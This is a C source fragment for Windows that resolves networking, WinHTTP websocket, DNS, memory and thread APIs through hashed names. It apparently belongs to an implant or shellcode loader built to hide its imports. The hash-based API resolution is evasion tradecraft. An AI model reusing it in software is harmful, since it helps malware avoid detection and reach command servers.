#include "stdint.h"
#include "windows.h"

DWORD resolveFPointers(fPointers* ptr_fpointers) {

	if ((ptr_fpointers->_CloseHandle = (CLOSEHANDLE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_CLOSEHANDLE ) ) == 0x00 ) return FAIL;
	if ((ptr_fpointers->_Closesocket = (CLOSESOCKET)getFunctionPtr(CRYPTED_HASH_WS32, CRYPTED_HASH_CLOSESOCKET ) ) == 0x00 ) return FAIL;
	if ((ptr_fpointers->_Connect = (CONNECT)getFunctionPtr(CRYPTED_HASH_WS32, CRYPTED_HASH_CONNECT ) ) == 0x00) return FAIL;
	if ((ptr_fpointers->_CopyMemory = (COPYMEMORY)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_COPYMEMORY ) ) == 0x00) return FAIL;
	if ((ptr_fpointers->_CreateThread = (CREATETHREAD)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_CREATETHREAD)) == 0x00) return FAIL;
	if ((ptr_fpointers->_DnsQuery_A = (DNSQUERY_A)getFunctionPtr(CRYPTED_HASH_DNSAPI, CRYPTED_HASH_DNSQUERYA)) == 0x00) return FAIL;
	if ((ptr_fpointers->_ioctlsocket = (IOCTLSOCKET)getFunctionPtr(CRYPTED_HASH_WS32, CRYPTED_HASH_IOCTLSOCKET)) == 0x00) return FAIL;
	if ((ptr_fpointers->_socket = (_SOCKET)getFunctionPtr(CRYPTED_HASH_WS32, CRYPTED_HASH_SOCKET)) == 0x00) return FAIL;
	if ((ptr_fpointers->_VirtualAlloc = (VIRTUALALLOC)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYTPED_HASH_VIRTUALALLOC)) == 0x00) return FAIL;
	if ((ptr_fpointers->_VirtualFree = (VIRTUALFREE)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_VIRTUALFREE)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WaitForSingleObject = (WAITFORSINGLEOBJECT)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_WAITFORSINGLEOBJECT)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpCloseHandle = (WINHTTPCLOSEHANDLE)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WINHTTPCLOSEHANDLE)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpConnect = (WINHTTPCONNECT)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WINHTTPCONNECT)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpOpen = (WINHTTPOPEN)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WINHTTPOPEN)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpOpenRequest = (WINHTTPOPENREQUEST)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WINHTTPOPENREQUEST)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpReceiveResponse = (WINHTTPRECEIVERESPONSE)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WINHTTPRECEIVERESPONSE)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpSendRequest = (WINHTTPSENDREQUEST)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WINHTTPSENDREQUEST)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpSetOption = (WINHTTPSETOPTION)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WINHTTPSETOPTION)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpWebSocketClose = (WINHTTPWEBSOCKETCLOSE)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WEBSOCKETCLOSE)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpWebSocketCompleteUpgrade = (WINHTTPWEBSOCKETCOMPLETEUPGRADE)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WINHTTPWEBSOCKETCOMPLETEUPGRADE)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpWebSocketReceive = (WINHTTPWEBSOCKETRECEIVE)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WINHTTPWEBSOCKETRECEIVE)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpWebSocketSend = (WINHTTPWEBSOCKETSEND)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WINHTTPWEBSOCKETSEND)) == 0x00) return FAIL;
	if ((ptr_fpointers->_WinHttpWebSocketShutdown = (WINHTTPWEBSOCKETSHUTDOWN)getFunctionPtr(CRYPTED_HASH_WINHTTP, CRYPTED_HASH_WINHTTPWEBSOCKETSHUTDOWN)) == 0x00) return FAIL;
	if ((ptr_fpointers->_lstrlenA = (LSTRLENA)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_LSTRLENA)) == 0x00) return FAIL;
	if ((ptr_fpointers->_lstrlenW = (LSTRLENW)getFunctionPtr(CRYPTED_HASH_KERNEL32, CRYPTED_HASH_LSTRLENW)) == 0x00) return FAIL;
	if ((ptr_fpointers->_send = (SEND)getFunctionPtr(CRYPTED_HASH_WS32, CRYPTED_HASH_SEND)) == 0x00) return FAIL;
	if ((ptr_fpointers->_recv = (RECV)getFunctionPtr(CRYPTED_HASH_WS32, CRYPTED_HASH_RECV)) == 0x00) return FAIL;
	if ((ptr_fpointers->_select = (SELECT)getFunctionPtr(CRYPTED_HASH_WS32, CRYPTED_HASH_SELECT)) == 0x00) return FAIL;
	if ((ptr_fpointers->_wsafdisset = (WSAFDISSET)getFunctionPtr(CRYPTED_HASH_WS32, CRYPTED_HASH_WSAFDISSET)) == 0x00) return FAIL;

	return SUCCESS;

}
